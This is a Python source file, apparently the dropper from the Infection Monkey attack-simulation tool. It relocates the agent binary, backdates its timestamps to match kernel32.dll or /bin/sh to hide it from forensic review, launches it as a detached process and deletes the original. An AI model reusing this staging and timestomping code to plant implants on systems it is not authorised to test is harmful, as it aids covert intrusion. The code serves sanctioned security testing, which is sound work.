import argparse
import filecmp
import logging
import os
import pprint
import shutil
import subprocess
import sys
import time
from pathlib import PosixPath, WindowsPath

from common.utils.argparse_types import positive_int
from common.utils.environment import is_windows_os
from infection_monkey.utils.commands import (
    build_monkey_commandline_explicitly,
    get_monkey_commandline_linux,
    get_monkey_commandline_windows,
)
from infection_monkey.utils.file_utils import mark_file_for_deletion_on_windows

if "win32" == sys.platform:
    from win32process import DETACHED_PROCESS

    DATE_REFERENCE_PATH_WINDOWS = os.path.expandvars(WindowsPath(r"%windir%\system32\kernel32.dll"))
else:
    DETACHED_PROCESS = 0
    DATE_REFERENCE_PATH_LINUX = PosixPath("/bin/sh")

# Linux doesn't have WindowsError
try:
    WindowsError
except NameError:
    # noinspection PyShadowingBuiltins
    WindowsError = IOError


logger = logging.getLogger(__name__)

MOVEFILE_DELAY_UNTIL_REBOOT = 4


class MonkeyDrops(object):
    def __init__(self, args):
        arg_parser = argparse.ArgumentParser()
        arg_parser.add_argument("-p", "--parent")
        arg_parser.add_argument("-s", "--servers", type=lambda arg: arg.strip().split(","))
        arg_parser.add_argument("-d", "--depth", type=positive_int, default=0)
        arg_parser.add_argument("-l", "--location")
        arg_parser.add_argument("-vp", "--vulnerable-port")
        self.opts = arg_parser.parse_args(args)

        self._config = {
            "source_path": os.path.abspath(sys.argv[0]),
            "destination_path": self.opts.location,
        }

        logger.debug("Dropper is running with config:\n%s", pprint.pformat(self._config))

    def start(self):
        if self._config["destination_path"] is None:
            logger.error("No destination path specified")
            return False

        # we copy/move only in case path is different
        try:
            file_moved = filecmp.cmp(self._config["source_path"], self._config["destination_path"])
        except OSError:
            file_moved = False

        if not file_moved and os.path.exists(self._config["destination_path"]):
            os.remove(self._config["destination_path"])

        # always try to move the file first
        if not file_moved:
            try:
                shutil.move(self._config["source_path"], self._config["destination_path"])

                logger.info(
                    "Moved source file '%s' into '%s'",
                    self._config["source_path"],
                    self._config["destination_path"],
                )

                file_moved = True
            except (WindowsError, IOError, OSError) as exc:
                logger.debug(
                    "Error moving source file '%s' into '%s': %s",
                    self._config["source_path"],
                    self._config["destination_path"],
                    exc,
                )

        # if file still need to change path, copy it
        if not file_moved:
            try:
                shutil.copy(self._config["source_path"], self._config["destination_path"])

                logger.info(
                    "Copied source file '%s' into '%s'",
                    self._config["source_path"],
                    self._config["destination_path"],
                )
            except (WindowsError, IOError, OSError) as exc:
                logger.error(
                    "Error copying source file '%s' into '%s': %s",
                    self._config["source_path"],
                    self._config["destination_path"],
                    exc,
                )

                return False

        if sys.platform == "win32":
            dropper_date_reference_path = DATE_REFERENCE_PATH_WINDOWS
        else:
            dropper_date_reference_path = DATE_REFERENCE_PATH_LINUX

        try:
            ref_stat = os.stat(dropper_date_reference_path)
        except OSError:
            logger.warning(
                "Cannot set reference date using '%s', file not found",
                dropper_date_reference_path,
            )
        else:
            try:
                os.utime(self._config["destination_path"], (ref_stat.st_atime, ref_stat.st_mtime))
            except OSError:
                logger.warning("Cannot set reference date to destination file")

        monkey_options = build_monkey_commandline_explicitly(
            parent=self.opts.parent,
            servers=self.opts.servers,
            depth=self.opts.depth,
            location=None,
        )

        if is_windows_os():
            monkey_commandline = get_monkey_commandline_windows(
                self._config["destination_path"], monkey_options
            )

            monkey_process = subprocess.Popen(
                monkey_commandline,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                close_fds=True,
                creationflags=DETACHED_PROCESS,
            )
        else:
            dest_path = self._config["destination_path"]
            # In Linux, we need to change the directory first, which is done
            # using thw `cwd` argument in `subprocess.Popen` below

            monkey_commandline = get_monkey_commandline_linux(dest_path, monkey_options)

            monkey_process = subprocess.Popen(
                monkey_commandline,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                close_fds=True,
                cwd="/".join(dest_path.split("/")[0:-1]),
                creationflags=DETACHED_PROCESS,
            )

        logger.info(
            "Executed monkey process (PID=%d) with command line: %s",
            monkey_process.pid,
            " ".join(monkey_commandline),
        )

        time.sleep(3)
        if monkey_process.poll() is not None:
            logger.warning("Seems like monkey died too soon")

    def cleanup(self):
        logger.info("Cleaning up the dropper")

        try:
            if self._config["source_path"].lower() != self._config[
                "destination_path"
            ].lower() and os.path.exists(self._config["source_path"]):

                # try removing the file first
                try:
                    os.remove(self._config["source_path"])
                except Exception as exc:
                    logger.debug(
                        "Error removing source file '%s': %s", self._config["source_path"], exc
                    )

                    # mark the file for removal on next boot
                    mark_file_for_deletion_on_windows(WindowsPath(self._config["source_path"]))
            logger.info("Dropper cleanup complete")
        except AttributeError:
            logger.error("Invalid configuration options. Failing")
